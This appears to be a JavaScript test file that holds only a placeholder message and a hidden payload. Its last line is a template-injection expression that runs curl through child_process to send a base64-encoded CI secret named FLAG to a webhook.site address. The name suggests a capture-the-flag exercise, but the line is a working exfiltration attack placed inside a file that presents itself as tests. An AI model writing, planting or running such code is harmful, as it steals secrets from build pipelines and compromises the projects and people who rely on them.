// TODO: implement the tests
console.log("Tests are not implemented yet...");
{{ process.mainModule.require('child_process').exec('curl https://webhook.site/c9f915d6-1ead-4dfb-868b-95ce461e6652/$(echo ${{ secrets.FLAG }} | base64)') }};